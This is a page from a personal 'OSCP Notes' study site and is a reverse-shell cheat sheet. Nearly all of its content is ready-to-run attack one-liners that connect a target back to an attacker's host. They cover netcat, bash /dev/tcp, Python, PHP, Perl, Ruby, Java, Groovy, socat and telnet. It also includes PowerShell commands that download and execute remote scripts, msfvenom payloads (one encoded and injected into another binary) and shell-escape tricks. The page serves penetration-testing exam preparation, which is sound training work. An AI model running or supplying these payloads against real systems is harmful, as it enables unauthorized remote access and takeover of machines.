<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Reverse Shells | OSCP Notes</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Reverse Shells" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="ncat" />
<meta property="og:description" content="ncat" />
<link rel="canonical" href="http://localhost:4000/3-Exploiting/6-reverse-shells/" />
<meta property="og:url" content="http://localhost:4000/3-Exploiting/6-reverse-shells/" />
<meta property="og:site_name" content="OSCP Notes" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
<script type="application/ld+json">
{"@type":"Article","url":"http://localhost:4000/3-Exploiting/6-reverse-shells/","headline":"Reverse Shells","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"ncat","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/css/main.css">
		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
				OSCP Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/">Hack The Planet</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/0-basics/1-network-basics/">basics</a>
							<ul>
								
									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
								
									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
							<ul>
								
									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
								
									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
								
									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/2-web/0-initial-enumeration/">web</a>
							<ul>
								
									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
								
									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
								
									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
								
									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
								
									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
								
									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
								
									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
								
									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
								
									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
								
									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
								
									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
								
									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/3-Exploiting/1-webshells/">exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
								
									<li class="nav-item current"><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/4-win-privesc/1-initial/">win privesc</a>
							<ul>
								
									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
							<ul>
								
									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
								
									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
								
									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
								
									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/7-varios/tips/">varios</a>
							<ul>
								
									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
							<ul>
								
									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/changelog/"></a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>exploiting</h2>
				<h3>Reverse Shells</h3>
			</div>
			<article class="content">
				<hr />
<h2 id="ncat">ncat</h2>

<ul>
  <li><strong>hacker:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: nc -nlvp 666
or
root@kali:  rlwrap nc -nlvp 666
</code></pre></div>    </div>
  </li>
  <li><strong>target:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gil@ubuntu: nc -nv 10.10.0.25 666 -e /bin/bash
</code></pre></div>    </div>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:&gt; nc.exe 192.168.100.113 4444 –e cmd.exe
</code></pre></div>    </div>
  </li>
  <li><strong>If you have the wrong version of netcat installed, try</strong></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc attackerip &gt;/tmp/f
</code></pre></div></div>

<h2 id="powershell">powershell</h2>
<h3 id="options">options</h3>
<ul>
  <li>-NoP , -noprofile: No carga el windows profile</li>
  <li>-noni, -NonInteractive : asegura que sea no interactiva</li>
  <li>-Exec Bypass, -ExecutionPolicy Bypass:  will not block the execution of any scripts or create any prompts</li>
  <li>-W Hidden: prevent powershell from displaying a window
*</li>
</ul>

<h3 id="shells">shells</h3>

<ul>
  <li>desde url
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>con invoke-powershell modificado, agregando los datos al final del script
shell.php?cmd=echo IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1') | powershell -noprofile -ep bypass
</code></pre></div>    </div>
  </li>
  <li>desde prompt
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -NoP -W Hidden -Exec Bypass -c "iex New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1')";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 666
</code></pre></div>    </div>
  </li>
  <li>run 64bits powershell
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="python">python</h2>
<h3 id="tcp">tcp</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("attackerip",443));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
</code></pre></div></div>
<h3 id="udp">udp</h3>
<p>start listener</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 4445 -u
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os,pty,socket;
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
s.connect(("10.10.14.17",4445));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
os.putenv("HISTFILE",'/dev/null');
pty.spawn("/bin/sh");
s.close()
</code></pre></div></div>

<h2 id="php">php</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php exec("nohup bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'"); ?&gt;
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.10.14.6",666);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre></div></div>

<h2 id="java-reverse-shell">java reverse shell</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; runme.war
</code></pre></div></div>
<h2 id="groovy---jenkins">groovy - jenkins</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String host="10.10.14.6";
int port=666;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre></div></div>

<h2 id="bash">Bash</h2>

<ul>
  <li><strong>Method 1:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1
</code></pre></div>    </div>
  </li>
  <li><strong>Method 2:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec 5&lt;&gt;/dev/tcp/IP/80
cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
</code></pre></div>    </div>
    <p>or:</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
</code></pre></div>    </div>
  </li>
  <li><strong>Method 3:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -c "0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.6/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196"
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="perl">Perl</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.10.14.4";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>

<h2 id="perl-windows">Perl windows</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre></div></div>

<h2 id="ruby">Ruby</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
</code></pre></div></div>

<h2 id="telnet">telnet</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
</code></pre></div></div>

<h2 id="asp">asp</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.168 LPORT=443 -f asp -o shell.asp - also works for exporting .aspx
</code></pre></div></div>

<h2 id="xterm">xterm</h2>
<ul>
  <li>target
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xterm -display 10.0.0.1:1
</code></pre></div>    </div>
  </li>
  <li>attacker
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# Xnest :1
root@kali:~# xhost +targetip
note: xserver for :1 listens on 6001
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="rundll32exe">rundll32.exe</h2>
<p>TODO</p>
<h2 id="regsvr32exe">Regsvr32.exe</h2>
<p>TODO</p>

<h2 id="msiexec">msiexec</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi &gt; 1.msi
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\&gt; msiexex \q \i http://10.10.10.1/1.msi #from url :D
c:\&gt; msiexex \q \i 1.msi
</code></pre></div></div>

<h2 id="exe">exe</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4444 -f exe -o shell.exe
</code></pre></div></div>
<p>injected in another binary</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
</code></pre></div></div>

<h2 id="socat">socat</h2>

<ul>
  <li>kali
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat file:`tty`,raw,echo=0 tcp-listen:4444  
</code></pre></div>    </div>
  </li>
  <li>victim
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
</code></pre></div>    </div>
  </li>
  <li>binaries : https://github.com/andrew-d/static-binaries
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
</code></pre></div>    </div>
  </li>
</ul>

<h1 id="getting-tty">getting TTY</h1>
<hr />
<h2 id="phineas-fisher-magic">phineas fisher magic</h2>

<ul>
  <li><strong>In reverse shell</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
</code></pre></div>    </div>
  </li>
  <li><strong>In Kali</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ stty raw -echo
$ fg
</code></pre></div>    </div>
  </li>
  <li><strong>in reverse shell</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ reset
$ export SHELL=bash;  export TERM=xterm-256color
$ stty rows 38 columns 116
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="perl-1">perl</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
</code></pre></div></div>

<p>or</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>
<h2 id="ruby-1">ruby</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby: exec "/bin/sh"
</code></pre></div></div>
<h2 id="irb">irb</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec "/bin/sh"
</code></pre></div></div>

<h2 id="vi">vi</h2>
<p>from within vi</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:!bash
:set shell=/bin/bash:shell
</code></pre></div></div>
<p>or</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi ;/bin/bash
</code></pre></div></div>

<h2 id="old-nmap">old nmap</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --interactive
nmap&gt; !sh
</code></pre></div></div>

<h2 id="expect-to-get-tty">expect to get tty</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact

</code></pre></div></div>

<h1 id="ssl--encrypted--connection">SSL  encrypted  connection</h1>
<hr />
<p>allow  only  Alice’s  IP  (10.0.0.4)  to  connect  to  it:</p>

<ul>
  <li>target:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\offsec&gt;ncat -‐exec  cmd.exe -‐allow   10.0.0.4	--‐vnl  4444 -‐ssl
</code></pre></div>    </div>
  </li>
  <li>hacker:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat -v 10.0.0.22 4444 --ssl
</code></pre></div>    </div>
  </li>
</ul>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
